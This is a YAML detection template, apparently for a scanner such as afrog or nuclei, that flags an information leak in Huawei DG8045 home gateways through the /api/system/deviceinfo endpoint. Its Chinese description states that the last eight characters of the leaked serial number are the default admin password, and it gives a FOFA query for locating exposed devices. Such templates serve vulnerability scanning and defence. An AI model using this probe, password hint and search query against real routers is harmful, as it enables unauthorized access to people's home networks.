# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"DeviceName":'
          - '"SerialNumber":'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/api/system/deviceinfo'
id: huawei-dg8045-home-gateway-password-leakage
info:
  author: zan8in
  description: |-
    Huawei DG8045 deviceinfo api接口存在信息泄漏漏洞，攻击者通过泄漏的信息可以获得账号密码登录后台。
    ------------ SerialNumber 后8位即为初始密码------------
    fofa: app="DG8045-Home-Gateway-DG8045"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Huawei DG8045 deviceinfo 信息泄漏漏洞
  severity: high
  tags: huawei,disclosure,argus-import
